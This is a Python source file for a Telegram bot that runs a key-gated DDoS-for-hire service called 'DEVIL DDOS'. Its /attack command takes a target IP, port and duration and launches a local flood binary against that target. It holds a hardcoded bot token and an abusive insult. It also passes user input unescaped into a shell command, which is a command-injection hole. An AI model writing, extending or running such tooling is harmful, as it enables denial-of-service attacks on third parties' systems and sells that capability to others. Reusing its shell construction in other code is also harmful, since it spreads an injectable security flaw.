from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import random
import string

# Add your bot token here
BOT_TOKEN = "8042941661:AAGlAf9lA7Bpwc5RSVA1m6mM-YIsgxN4TS4"

# Add the admin user ID
ADMIN_ID = 6942423757  # Replace with the actual Telegram ID of the admin

# Store redeemed keys
authorized_users = set()
valid_keys = set()


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler for the /start command."""
    user_id = update.effective_user.id
    if user_id in authorized_users or user_id == ADMIN_ID:
        await update.message.reply_text(
            "🔥 Welcome to DEVIL DDOS world 🔥\n\n"
            "Use /attack <ip> <port> <duration>\n"
            "Let the war begin! ⚔️💥"
        )
    else:
        await update.message.reply_text("TERI MAA KI CHUT PALE OWNER SE TO BAAR KER LE @DEVILVIPDDOS")


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler for the /help command."""
    user_id = update.effective_user.id
    if user_id in authorized_users or user_id == ADMIN_ID:
        await update.message.reply_text("Available commands: /start, /help, /attack, /genkey, /redeem")
    else:
        await update.message.reply_text("❌ You need to redeem a valid key to use this command!")


async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler for the /genkey command."""
    user_id = update.effective_user.id
    if user_id == ADMIN_ID:
        # Generate a random key
        key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
        valid_keys.add(key)
        await update.message.reply_text(f"Generated key: {key}")
    else:
        await update.message.reply_text("❌ You are not authorized to use this bot")


async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler for the /redeem command."""
    user_id = update.effective_user.id
    if context.args:
        key = context.args[0]
        if key in valid_keys:
            valid_keys.remove(key)
            authorized_users.add(user_id)
            await update.message.reply_text("✅ Key redeemed successfully! You can now use the /start command.")
        else:
            await update.message.reply_text("❌ Invalid or already redeemed key!")
    else:
        await update.message.reply_text("Please provide a key to redeem. Usage: /redeem <key>")


import asyncio

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler for the /attack command."""
    user_id = update.effective_user.id
    if user_id in authorized_users or user_id == ADMIN_ID:
        if len(context.args) == 3:
            target, port, time = context.args
            try:
                # Convert duration to an integer
                time = int(time)

                # Notify the user that the attack has started
                await update.message.reply_text(
                    f"⚔️ Attacking IP: {target} on Port: {port} for {time} seconds. 💥"
                )

                # Construct the full command to execute
                full_command = f"./DEVIL {target} {port} {time} 10"

                # Execute the command as a subprocess
                process = await asyncio.create_subprocess_shell(
                    full_command,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )

                # Wait for the process to complete
                stdout, stderr = await process.communicate()

                # Handle the output of the process
                if stdout:
                    await update.message.reply_text(f"✅ Output:\n{stdout.decode()}")
                if stderr:
                    await update.message.reply_text(f"⚠️ Error:\n{stderr.decode()}")

                # Simulate attack duration
                await asyncio.sleep(time)

                # Notify the user that the attack has finished
                await update.message.reply_text(
                    f"🔥 Attack on IP {target} has finished! 💥"
                )

            except ValueError:
                # Handle invalid time input
                await update.message.reply_text("❌ Duration must be a valid number.")
            except Exception as e:
                # Handle unexpected errors
                await update.message.reply_text(f"❌ Failed to execute attack: {e}")
        else:
            # Inform the user about correct usage
            await update.message.reply_text("Usage: /attack <ip> <port> <duration>")
    else:
        # Inform unauthorized users about key redemption
        await update.message.reply_text("❌ You need to redeem a valid key to use this command!")


def main():
    """Main function to start the bot."""
    # Create the Application
    application = Application.builder().token(BOT_TOKEN).build()

    # Register command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("attack", attack))

    # Start the bot
    print("Bot is running...")
    application.run_polling()


# Run the bot
if __name__ == "__main__":
    main()